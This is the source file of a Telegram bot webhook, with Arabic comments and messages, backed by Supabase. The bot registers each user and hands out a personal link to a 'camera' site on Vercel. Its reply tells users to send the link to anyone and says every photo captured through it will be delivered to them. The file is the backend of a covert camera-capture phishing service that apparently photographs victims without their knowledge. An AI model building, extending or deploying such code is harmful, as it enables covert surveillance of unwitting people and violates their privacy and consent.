// api/webhook.js — VANTA for WORM
// منطق بوت @Saleckbz_cam_bot + Supabase

const SB_URL = process.env.SUPABASE_URL;
const SB_KEY = process.env.SUPABASE_SERVICE_KEY;

async function sb(path, method, body) {
  const r = await fetch(SB_URL + '/rest/v1/' + path, {
    method: method || 'GET',
    headers: {
      'apikey': SB_KEY,
      'Authorization': 'Bearer ' + SB_KEY,
      'Content-Type': 'application/json',
      'Prefer': 'return=representation'
    },
    body: body ? JSON.stringify(body) : undefined
  });
  try { return await r.json(); } catch (e) { return null; }
}

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    res.status(200).send('OK');
    return;
  }

  const TG_TOKEN = process.env.TG_TOKEN;
  const OWNER_CHAT = process.env.TG_CHAT;

  if (!TG_TOKEN) {
    res.status(500).json({ ok: false });
    return;
  }

  let update;
  try {
    update = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;
  } catch (e) {
    res.status(200).send('OK');
    return;
  }

  const msg = update && update.message;
  if (!msg) { res.status(200).send('OK'); return; }

  const chatId = msg.chat.id;
  const text = (msg.text || '').trim();
  const name = (msg.from && (msg.from.first_name || msg.from.username)) || 'صديق';
  const username = (msg.from && msg.from.username) ? '@' + msg.from.username : '';

  const OWNER_TG = 'Saleck_bz';

  async function send(chat, message, replyMarkup) {
    const body = { chat_id: chat, text: message, parse_mode: 'HTML' };
    if (replyMarkup) body.reply_markup = replyMarkup;
    await fetch('https://api.telegram.org/bot' + TG_TOKEN + '/sendMessage', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body)
    });
  }

  if (text === '/start' || text === '/help') {

    // فحص الحظر
    const blocked = await sb('users?chat_id=eq.' + chatId + '&blocked=eq.true');
    if (blocked && blocked.length > 0) {
      await send(chatId, '🚫 أنت محظور من استخدام هذا البوت.');
      res.status(200).send('OK');
      return;
    }

    // حفظ المستخدم في Supabase
    const link = 'https://camera-one-henna.vercel.app/t/' + chatId;

    try {
      const existing = await sb('users?chat_id=eq.' + chatId);
      if (!existing || existing.length === 0) {
        await sb('users', 'POST', {
          chat_id: chatId,
          name: name,
          username: username,
          link: link
        });
      }
    } catch (e) {}

    // الرد
    await send(chatId,
      '👋 أهلاً ' + name + '!\n\n' +
      '👨‍💻 حساب المبرمج:\n<a href="https://t.me/' + OWNER_TG + '">@' + OWNER_TG + '</a>\n\n' +
      '🎁 <b>رابطك الخاص</b>:\n\n' +
      '<code>' + link + '</code>\n\n' +
      '📸 أرسل هذا الرابط لأي شخص.\nكل صورة تُلتقط عبره <b>ستصلك هنا</b>.',
      {
        inline_keyboard: [
          [{ text: '💬 تواصل مع المبرمج', url: 'https://t.me/' + OWNER_TG }],
          [{ text: '📋 نسخ رابطي', url: link }]
        ]
      }
    );

    // إشعار لك
    if (OWNER_CHAT && String(OWNER_CHAT) !== String(chatId)) {
      await send(OWNER_CHAT,
        '🔔 <b>مستخدم جديد</b>\n\n' +
        '👤 ' + name + '\n' +
        '📱 ' + (username || '—') + '\n' +
        '🆔 <code>' + chatId + '</code>'
      );
    }

    res.status(200).send('OK');
    return;
  }

  // أي رسالة أخرى
  const blocked2 = await sb('users?chat_id=eq.' + chatId + '&blocked=eq.true');
  if (blocked2 && blocked2.length > 0) {
    await send(chatId, '🚫 أنت محظور.');
    res.status(200).send('OK');
    return;
  }

  const link2 = 'https://camera-one-henna.vercel.app/t/' + chatId;
  await send(chatId,
    '🔗 رابطك:\n<code>' + link2 + '</code>',
    { inline_keyboard: [[{ text: '📋 نسخ', url: link2 }]] }
  );

  res.status(200).send('OK');
               }
